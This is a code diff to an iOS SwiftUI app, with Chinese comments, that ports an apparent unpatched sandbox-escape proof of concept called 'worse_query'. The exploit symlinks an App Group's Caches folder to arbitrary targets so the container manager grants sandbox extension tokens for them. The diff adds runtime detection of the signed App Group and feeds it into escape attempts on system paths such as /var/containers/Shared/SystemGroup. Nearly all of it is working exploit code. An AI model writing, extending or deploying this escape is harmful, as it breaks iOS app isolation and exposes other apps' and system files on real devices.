@@ -1,12 +1,37 @@
 import SwiftUI
+import Security
 
-// MARK: - worse_query 沙盒逃逸移植（探测版 v0）
+// MARK: - worse_query 沙盒逃逸移植（探测版 v1）
 // 源自 forcequitOS/worse_query PoC (GPL-3.0, Taj C/forcequit, 2026-11-08)
 // 原理：App Group 的 Library/Caches 换成指向任意目标的符号链接，
 // 向容器管理器查询组缓存分区，管理器跟链接给目标签发沙盒扩展令牌。
 // Apple 未修（截至 2026-11-16），仅供个人研究使用。
+// v1 关键更新：签名工具(LCSign)会把申报的组名替换成它现发的随机组
+// （WQ Files 日志实证 group.<hash>.N），所以组名必须运行时从自身签名读。
 
 enum WQ {
+    static let declaredGroup = "group.com.sian.DouyinBox"
+
+    // 从自身代码签名的 entitlements 里读实际发到的 App Group
+    static func detectedGroups() -> [String] {
+        var code: SecCode?
+        guard SecCodeCopySelf([], &code) == 0, let code else { return [] }
+        var stat: SecStaticCode?
+        guard SecCodeCopyStaticCode(code, [], &stat) == 0, let stat else { return [] }
+        var infoRef: CFDictionary?
+        let flags = SecCSFlags(rawValue: UInt(kSecCSSigningInformation))
+        guard SecCodeCopySigningInformation(stat, flags, &infoRef) == 0,
+              let info = infoRef as? [String: Any],
+              let ents = info[kSecCodeInfoEntitlements as String] as? [String: Any],
+              let groups = ents["com.apple.security.application-groups"] as? [String] else { return [] }
+        return groups
+    }
+
+    static func workingGroup() -> String? {
+        let gs = detectedGroups()
+        if let g = gs.first { return g }
+        return FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: declaredGroup) != nil ? declaredGroup : nil
+    }
     typealias FNCreate = @convention(c) () -> UnsafeMutableRawPointer?
     typealias FNSetU64 = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
     typealias FNSetXPC = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?) -> Void
@@ -17,8 +42,6 @@ enum WQ {
     typealias FNRelease = @convention(c) (Int64) -> Int32
     typealias FNXpcStr = @convention(c) (UnsafePointer<CChar>?) -> UnsafeMutableRawPointer?
 
-    static let groupID = "group.com.sian.DouyinBox"
-
     static func restoreCaches(_ group: String) {
         guard let root = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) else { return }
         let caches = root.appendingPathComponent("Library/Caches")
@@ -27,7 +50,7 @@ enum WQ {
     }
 
     /// 申请 target 的沙盒扩展；返回 >=0 为句柄，<0 为错误码
-    static func escape(_ target: String, group: String = groupID, altFlags: Bool = false) -> Int64 {
+    static func escape(_ target: String, group: String, altFlags: Bool = false) -> Int64 {
         var st = stat()
         if lstat(target, &st) != 0 { return -255 }
         guard let groupRoot = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: group) else { return -1 }
@@ -118,13 +141,15 @@ final class WQProbe: ObservableObject {
             let t0 = Date()
             await MainActor.run { self.log("=== worse_query 探测 " + Date().formatted(.dateTime.year().month(.twoDigits).day(.twoDigits).hour(.twoDigits(amPM: .omitted)).minute().second().second(.twoDigits)) + " 本地时间 ===") }
 
-            // 0. App Group 票是否在手
-            let gr = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: WQ.groupID)
+            // 0. 从自身签名读实际组票（LCSign 会换名，WQ 实证）
+            let gs = WQ.detectedGroups()
+            let gr = WQ.workingGroup()
             await MainActor.run {
-                self.log("0) App Group: \(gr == nil ? "✗ 拿不到（签名没带组权限）" : "✓ " + (gr?.path ?? ""))")
+                self.log("0) 签名内申报的组: \(gs.isEmpty ? "(读不到)" : gs.joined(separator: ", "))")
+                self.log("   可用容器: \(gr == nil ? "✗ 一张票都没发到" : "✓ " + gr!)")
             }
-            if gr == nil {
-                await MainActor.run { self.running = false; self.log("=== 中止：先补组权限 ===") }
+            guard let group = gr else {
+                await MainActor.run { self.running = false; self.log("=== 中止：无可用组 ===") }
                 return
             }
 
@@ -135,10 +160,10 @@ final class WQProbe: ObservableObject {
                 ("/var/containers/Shared/SystemGroup", "4) 系统共享组(iOS27)"),
             ]
             for (path, label) in targets {
-                var h = WQ.escape(path)
+                var h = WQ.escape(path, group: group)
                 var tried = ""
                 if h < 0 {
-                    h = WQ.escape(path, altFlags: true)
+                    h = WQ.escape(path, group: group, altFlags: true)
                     tried = "（alt 旗标）"
                 }
                 if h >= 0 { handles.append(h) }
